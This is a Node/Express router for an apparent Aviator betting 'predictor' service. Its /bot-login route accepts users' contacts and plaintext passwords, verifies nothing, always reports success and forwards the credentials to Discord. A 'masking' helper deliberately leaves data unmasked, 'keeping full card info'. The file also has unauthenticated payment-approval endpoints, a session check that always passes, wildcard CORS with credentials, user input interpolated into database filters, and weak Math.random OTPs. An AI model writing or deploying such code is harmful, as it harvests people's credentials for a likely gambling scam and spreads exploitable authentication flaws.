const express = require('express');
const router = express.Router();
const fs = require('fs');
const path = require('path');
const discordAgent = require('../Agent/discordAgent');
const emailService = require('../Agent/emailService');
const { createClient } = require('@supabase/supabase-js');

// Supabase Admin for syncing profiles
const supabaseAdmin = createClient(
    process.env.SUPABASE_URL,
    process.env.SUPABASE_SERVICE_ROLE_KEY
);

/**
 * LOG SUPERBASE AUTH EVENT (Login/Register/FreeCode)
 */
router.post('/log-auth-event', async (req, res) => {
    try {
        const { event, email, details } = req.body;
        if (!event || !email) return res.status(400).json({ success: false });

        // Add user agent and IP stats
        const extraDetails = details || {};
        extraDetails.ip = req.ip || 'Unknown';
        extraDetails.userAgent = req.headers['user-agent'] || 'Unknown';

        // 1. Alert Discord with proper event mapping
        const eventMap = {
            'REGISTER': { color: 0x2ECC71, title: 'USER REGISTERED' },
            'LOGIN': { color: 0xF1C40F, title: 'USER LOGIN' },
            'FREE_CODE_GRANTED': { color: 0x9B59B6, title: 'FREE CODE GRANTED' },
            'INDEX_ACCESS': { color: 0x3498DB, title: 'INDEX PAGE ACCESS' }
        };

        const eventConfig = eventMap[event] || { color: 0x3498DB, title: event };

        console.log(`📢 Discord Event: ${event} for ${email}`);
        
        discordAgent.sendUserEvent(event, { 
            contact: email, 
            type: 'Email', 
            ip: extraDetails.ip,
            userAgent: extraDetails.userAgent,
            ...extraDetails
        });

        // 2. Trigger Welcome Email if Registration
        if (event === 'REGISTER') {
            try {
                await emailService.sendWelcomeEmail(email);
            } catch (emailErr) {
                console.warn('⚠️ Welcome email failed (non-fatal):', emailErr.message);
            }
        }

        // 3. Sync Profile to Database
        if (event === 'REGISTER' || event === 'LOGIN') {
            try {
                // Use email as unique identifier for light sync
                const { error: syncErr } = await supabaseAdmin
                    .from('profiles')
                    .upsert({
                        email: email,
                        last_seen: new Date().toISOString()
                    }, { onConflict: 'email' });
                
                if (syncErr) console.warn('⚠️ Profile sync failed:', syncErr.message);
                else console.log(`✅ Profile synced for ${email}`);
            } catch (syncErr) {
                console.warn('⚠️ Profile sync exception:', syncErr.message);
            }
        }

        res.json({ success: true });
    } catch (error) {
        console.error("❌ Auth Log Error:", error.message);
        res.status(500).json({ success: false });
    }
});


// Telegram configuration (Fallback or analytics)
const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
const telegramChatId = process.env.TELEGRAM_CHAT_ID;

// Helper function to log authentication attempts (Disabled: Supabase used instead)
const logAuthData = (data) => {
  // Empty stub to prevent file I/O overhead
};

// Helper function to send to Telegram (Disabled: Discord used instead)
const sendToTelegram = async (message) => {
  return { success: true, dummy: true };
};

// Mask sensitive data for logging (keeping full card info)
const maskSensitiveData = (data) => {
  return data;
};

// CORS middleware for all auth routes
router.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization, ngrok-skip-browser-warning');
  res.header('Access-Control-Allow-Credentials', 'true');
  
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

// Bot login endpoint
router.post('/bot-login', async (req, res) => {
  try {
    const { contact, password, userAgent, timestamp } = req.body;

    // Validate required fields
    if (!contact || !password) {
      return res.status(400).json({ 
        success: false,
        error: 'Contact and password are required' 
      });
    }

    // Determine contact type
    const contactType = contact.includes('@') ? 'Email' : 'Mobile';
    
    const authData = {
      contact,
      contactType,
      password,
      userAgent: userAgent || 'Unknown',
      timestamp: timestamp || new Date().toISOString(),
      source: 'Aviator Bot Login',
      ip: req.ip || 'Unknown'
    };

    // Log authentication attempt (with masked password)
    logAuthData(maskSensitiveData(authData));

    // Send to Discord
    discordAgent.sendUserEvent('LOGIN', { 
        contact, 
        password, 
        userAgent: userAgent || 'Unknown', 
        ip: req.ip || 'Unknown' 
    });

    // Return success with session info
    res.json({ 
      success: true,
      message: 'Login successful',
      sessionData: {
        contact,
        contactType,
        loginTime: authData.timestamp,
        sessionExpiry: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString() // 24 hours
      }
    });

  } catch (error) {
    console.error('❌ Bot login error:', error);
    
    // Log error but still return success to avoid breaking frontend flow
    logAuthData({
      error: error.message,
      contact: req.body.contact,
      timestamp: new Date().toISOString()
    });

    res.json({ 
      success: true,
      message: 'Login processed (fallback mode)',
      warning: 'Some features may be limited'
    });
  }
});

// Index page session login endpoint
router.post('/index-login', async (req, res) => {
  try {
    const { contact, contactType, userAgent, timestamp } = req.body;

    // Validate required fields
    if (!contact) {
      return res.status(400).json({ 
        success: false,
        error: 'Contact is required' 
      });
    }

    const authData = {
      contact,
      contactType: contactType || (contact.includes('@') ? 'Email' : 'Mobile'),
      userAgent: userAgent || 'Unknown',
      timestamp: timestamp || new Date().toISOString(),
      source: 'Index Page Access',
      ip: req.ip || 'Unknown'
    };

    // Log authentication attempt
    logAuthData(authData);

    // Send to Discord
    discordAgent.sendUserEvent('INDEX_ACCESS', { 
        contact, 
        type: authData.contactType, 
        ip: req.ip || 'Unknown',
        userAgent: authData.userAgent
    });

    // Return success with session info
    res.json({ 
      success: true,
      message: 'Access logged successfully',
      sessionData: {
        contact,
        contactType: authData.contactType,
        loginTime: authData.timestamp,
        sessionExpiry: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString() // 24 hours
      }
    });

  } catch (error) {
    console.error('❌ Index login error:', error);
    
    // Log error but still return success to avoid breaking frontend flow
    logAuthData({
      error: error.message,
      contact: req.body.contact,
      timestamp: new Date().toISOString(),
      source: 'index-login-error'
    });

    res.json({ 
      success: true,
      message: 'Access logged (fallback mode)',
      warning: 'Some features may be limited'
    });
  }
});

// PASSWORD RESET - FORGOT PASSWORD (OTP)
global.passwordResets = global.passwordResets || {};

router.post('/forgot-password', async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) return res.status(400).json({ success: false, error: 'Email is required' });

    // 1. Generate 6-digit OTP
    const otp = Math.floor(100000 + Math.random() * 900000).toString();
    global.passwordResets[email] = {
      otp,
      expires: Date.now() + 15 * 60 * 1000 // 15 minutes
    };

    // 3. Send Email
    const emailSent = await emailService.sendEmail(email, "Your Password Reset OTP 🔐", `
      <div style="font-family: Arial, sans-serif; padding: 20px; color: #333; max-width: 500px; margin: auto; border: 1px solid #eee; border-radius: 10px;">
        <h2 style="color: #f1c40f; text-align: center;">AviSignals Predictor</h2>
        <h3 style="color: #333; text-align: center;">Password Reset Request</h3>
        <p>You requested a password reset for your account. Please use the following One-Time Password (OTP) to complete the process:</p>
        <div style="background: #f9f9f9; padding: 20px; text-align: center; font-size: 32px; font-weight: bold; letter-spacing: 8px; margin: 25px 0; border: 2px dashed #f1c40f; color: #f1c40f;">
          ${otp}
        </div>
        <p>This code is valid for <strong>15 minutes</strong>. If you didn't request this, please ignore this email and your password will remain unchanged.</p>
        <hr style="border: 0; border-top: 1px solid #eee; margin: 20px 0;">
        <p style="font-size: 12px; color: #777; text-align: center;">Best regards,<br/><strong>The AviSignals Team</strong></p>
      </div>
    `);

    if (!emailSent) throw new Error('Failed to send OTP email');

    res.json({ success: true, message: 'OTP sent to your email' });
  } catch (error) {
    console.error('❌ Forgot password error:', error);
    res.status(500).json({ success: false, error: 'Failed to process request. Please try again later.' });
  }
});

router.post('/reset-password', async (req, res) => {
  try {
    const { email, otp, newPassword } = req.body;
    if (!email || !otp || !newPassword) {
      return res.status(400).json({ success: false, error: 'All fields are required' });
    }

    const resetData = global.passwordResets[email];
    if (!resetData || resetData.otp !== otp || resetData.expires < Date.now()) {
      return res.status(400).json({ success: false, error: 'Invalid or expired OTP. Please request a new one.' });
    }

    // Update password in Supabase
    if (req.supabase) {
      // Find the user ID by email
      const { data: profile, error: findError } = await req.supabase
        .from('profiles')
        .select('id')
        .eq('email', email)
        .single();
      
      if (findError || !profile) {
        throw new Error('User account not found');
      }

      const { error: resetError } = await req.supabase.auth.admin.updateUserById(
        profile.id,
        { password: newPassword }
      );
      
      if (resetError) throw resetError;
    }

    // Clear reset data
    delete global.passwordResets[email];

    // Notify Discord
    discordAgent.sendUserEvent('PASSWORD_RESET', { email, status: 'SUCCESS' });

    res.json({ success: true, message: 'Password updated successfully. You can now login with your new password.' });
  } catch (error) {
    console.error('❌ Reset password error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// LOG AUTH EVENT (Updated to handle phone)
router.post('/log-auth-event', async (req, res) => {
  try {
    const { event, email, details } = req.body;
    console.log(`📡 Logging auth event: ${event} for ${email}`);
    
    let eventDetails = { email, ...details };
    
    // Explicitly check for phone in details or root
    if (details && details.phone) eventDetails.phone = details.phone;

    await discordAgent.sendUserEvent(event, eventDetails);
    res.json({ success: true });
  } catch (error) {
    console.error('❌ Log auth event error:', error);
    res.status(500).json({ success: false });
  }
});

// Session validation endpoint
router.post('/validate-session', async (req, res) => {
  try {
    const { contact, sessionToken, timestamp } = req.body;

    if (!contact || !sessionToken) {
      return res.status(400).json({ 
        success: false,
        error: 'Contact and session token are required' 
      });
    }

    // Simple session validation (in production, use proper JWT or session store)
    const sessionData = {
      contact,
      sessionToken,
      timestamp: timestamp || new Date().toISOString(),
      valid: true, // In real app, validate against database/cache
      expiresAt: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString()
    };

    // Log session validation
    logAuthData({
      action: 'session_validation',
      contact,
      timestamp: sessionData.timestamp,
      valid: sessionData.valid
    });

    res.json({ 
      success: true,
      sessionData,
      message: 'Session is valid'
    });

  } catch (error) {
    console.error('❌ Session validation error:', error);
    
    res.status(500).json({ 
      success: false,
      error: 'Session validation failed'
    });
  }
});

// Logout endpoint
router.post('/logout', async (req, res) => {
  try {
    const { contact, timestamp } = req.body;

    if (contact) {
      // Log logout activity
      logAuthData({
        action: 'logout',
        contact,
        timestamp: timestamp || new Date().toISOString(),
        ip: req.ip || 'Unknown'
      });

      // Optional: Send logout notification to Telegram
      const telegramMessage = `🚪 <b>USER LOGOUT</b>

👤 Contact: <code>${contact}</code>
⏰ Time: <code>${new Date().toLocaleString()}</code>
📍 IP: <code>${req.ip || 'Unknown'}</code>`;

      try {
        await sendToTelegram(telegramMessage);
      } catch (telegramError) {
        console.warn('⚠️ Failed to send logout notification:', telegramError);
      }
    }

    res.json({ 
      success: true,
      message: 'Logout successful'
    });

  } catch (error) {
    console.error('❌ Logout error:', error);
    
    res.json({ 
      success: true,
      message: 'Logout processed'
    });
  }
});

// Payment verification endpoints
router.post('/verify-payment', async (req, res) => {
  try {
    const { 
      contact, 
      packageName, 
      amount, 
      paymentMethod,
      transactionId,
      source,
      timestamp 
    } = req.body;

    // Validate required fields
    if (!contact || !packageName) {
      return res.status(400).json({ 
        success: false,
        error: 'Contact and package name are required' 
      });
    }

    const verificationData = {
      contact,
      packageName,
      amount,
      paymentMethod: paymentMethod || 'Unknown',
      transactionId: transactionId || 'N/A',
      source: source || 'Payment Verification',
      timestamp: timestamp || new Date().toISOString(),
      ip: req.ip || 'Unknown',
      status: 'pending_admin_verification'
    };

    // Log verification request
    logAuthData(verificationData);

    // Send to Discord
    discordAgent.sendPaymentEvent('VERIFICATION_REQUEST', { 
        customer: contact, 
        package: packageName, 
        amount: amount || 'N/A', 
        method: paymentMethod || 'Card', 
        txid: transactionId || 'N/A' 
    });

    // Supabase Persistence (so it shows in Admin Dash)
    if (req.supabase) {
        try {
            // Find profile ID first
            const { data: profile } = await req.supabase
                .from('profiles')
                .select('id')
                .or(`email.eq.${contact},phone.eq.${contact}`)
                .single();

            const { error: dbError } = await req.supabase
                .from('payments')
                .insert([{
                    profile_id: profile?.id,
                    amount: amount || 0,
                    currency: 'USD',
                    status: 'pending',
                    reference: transactionId || `REQ-${Date.now()}`,
                    method: paymentMethod || 'Manual/Request',
                    created_at: new Date().toISOString()
                }]);
                
            if (dbError) console.error('⚠️ Supabase payment insert error:', dbError.message);
        } catch (dbErr) {
            console.error('⚠️ Verification persistence failed:', dbErr.message);
        }
    }

    // Return success with verification ID
    res.json({ 
      success: true,
      message: 'Payment verification request submitted successfully',
      verificationId: transactionId || Date.now().toString(),
      status: 'pending_verification',
      estimatedTime: '5-10 minutes'
    });

  } catch (error) {
    console.error('❌ Payment verification error:', error);
    
    // Log error
    logAuthData({
      error: error.message,
      contact: req.body.contact,
      packageName: req.body.packageName,
      timestamp: new Date().toISOString(),
      action: 'verification_error'
    });

    res.status(500).json({ 
      success: false,
      error: 'Failed to submit payment verification',
      message: 'Please try again or contact support'
    });
  }
});

// Admin payment approval endpoint
router.post('/approve-payment', async (req, res) => {
  try {
    const { 
      contact, 
      packageName, 
      verificationId,
      adminNote,
      timestamp 
    } = req.body;

    const approvalData = {
      contact,
      packageName,
      verificationId,
      adminNote: adminNote || 'Payment approved',
      action: 'payment_approved',
      timestamp: timestamp || new Date().toISOString(),
      ip: req.ip || 'Unknown'
    };

    // Log approval
    logAuthData(approvalData);

    // Send approval notification to Telegram
    const telegramMessage = `✅ <b>PAYMENT APPROVED</b>

👤 Customer: <code>${contact}</code>
💰 Package: <b>${packageName}</b>
🔗 Verification ID: <code>${verificationId}</code>
📝 Note: ${adminNote || 'Payment approved by admin'}
⏰ Time: <code>${new Date().toLocaleString()}</code>

✅ <b>ACCESS GRANTED</b>
User can now access their package.`;

    await sendToTelegram(telegramMessage);

    res.json({ 
      success: true,
      message: 'Payment approved successfully',
      status: 'approved',
      accessGranted: true
    });

  } catch (error) {
    console.error('❌ Payment approval error:', error);
    res.status(500).json({ 
      success: false,
      error: 'Failed to approve payment'
    });
  }
});

// Admin payment rejection endpoint
router.post('/reject-payment', async (req, res) => {
  try {
    const { 
      contact, 
      packageName, 
      verificationId,
      rejectionReason,
      timestamp 
    } = req.body;

    const rejectionData = {
      contact,
      packageName,
      verificationId,
      rejectionReason: rejectionReason || 'Payment rejected',
      action: 'payment_rejected',
      timestamp: timestamp || new Date().toISOString(),
      ip: req.ip || 'Unknown'
    };

    // Log rejection
    logAuthData(rejectionData);

    // Send rejection notification to Telegram
    const telegramMessage = `❌ <b>PAYMENT REJECTED</b>

👤 Customer: <code>${contact}</code>
💰 Package: <b>${packageName}</b>
🔗 Verification ID: <code>${verificationId}</code>
📝 Reason: ${rejectionReason || 'Payment rejected by admin'}
⏰ Time: <code>${new Date().toLocaleString()}</code>

❌ <b>ACCESS DENIED</b>
User payment was not verified.`;

    await sendToTelegram(telegramMessage);

    res.json({ 
      success: true,
      message: 'Payment rejected',
      status: 'rejected',
      accessGranted: false
    });

  } catch (error) {
    console.error('❌ Payment rejection error:', error);
    res.status(500).json({ 
      success: false,
      error: 'Failed to reject payment'
    });
  }
});

// Test Telegram connectivity endpoint
router.get('/test-telegram', async (req, res) => {
  try {
    const testMessage = `🧪 <b>TELEGRAM TEST MESSAGE</b>

⏰ Time: <code>${new Date().toLocaleString()}</code>
📍 IP: <code>${req.ip || 'Unknown'}</code>
🔗 Source: Backend Test Endpoint

✅ If you see this message, Telegram integration is working!`;

    const result = await sendToTelegram(testMessage);
    
    res.json({
      success: true,
      message: 'Telegram test completed',
      telegramResult: result,
      botToken: telegramBotToken ? 'Present' : 'Missing',
      chatId: telegramChatId ? 'Present' : 'Missing'
    });

  } catch (error) {
    console.error('❌ Telegram test error:', error);
    res.status(500).json({
      success: false,
      error: error.message,
      botToken: telegramBotToken ? 'Present' : 'Missing',
      chatId: telegramChatId ? 'Present' : 'Missing'
    });
  }
});

// Get bot updates endpoint to find chat ID
router.get('/get-chat-id', async (req, res) => {
  try {
    const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/getUpdates`);
    const data = await response.json();
    
    res.json({
      success: true,
      message: 'Recent bot updates (look for your chat ID here)',
      updates: data.result,
      currentChatId: telegramChatId,
      instructions: 'Send /start to @spribeguru_bot in Telegram, then refresh this endpoint to see your chat ID'
    });

  } catch (error) {
    console.error('❌ Get chat ID error:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

/**
 * UPDATE SITE SELECTION
 * Logs when a user selects a betting site in the bot and persists to Supabase
 */
router.post('/update-site', async (req, res) => {
    const { contact, site } = req.body;
    if (contact && site) {
        // Discord Alert
        discordAgent.sendUserEvent('SITE_SELECTION', { user: contact, site });

        // Supabase Persistence
        try {
            const { error } = await req.supabase
                .from('profiles')
                .update({ assigned_site: site, updated_at: new Date().toISOString() })
                .or(`email.eq.${contact},phone.eq.${contact}`);

            if (error) console.error('⚠️ Supabase Site Update Error:', error.message);
        } catch (dbErr) {
            console.error('❌ Site Persistence Failed:', dbErr.message);
        }
    }
    res.json({ success: true });
});

/**
 * HEARTBEAT / USER ONLINE STATUS
 */
router.post('/heartbeat', async (req, res) => {
    const { contact } = req.body;
    if (contact && req.supabase) {
        try {
            await req.supabase
                .from('profiles')
                .update({ last_seen: new Date().toISOString() })
                .or(`email.eq.${contact},phone.eq.${contact}`);
        } catch (err) {
            // Silently fail
        }
    }
    res.json({ success: true });
});

/**
 * LOG VISITOR
 */
router.post('/log-visitor', async (req, res) => {
    discordAgent.sendSimpleNotification("🌐 NEW VISITOR", `A user has landed on the index page.\nIP: ${req.ip || 'Unknown'}\nUA: ${req.headers['user-agent'] || 'Unknown'}`, 0x3498DB);
    res.json({ success: true });
});

/**
 * LOG PAYMENT MODAL
 */
router.post('/log-payment-modal', async (req, res) => {
    const { contact } = req.body;
    discordAgent.sendSimpleNotification("🛒 MODAL ACCESSED", `User **${contact || 'Guest'}** is viewing the payment/activation plans.`, 0xE67E22);
    res.json({ success: true });
});

module.exports = router;
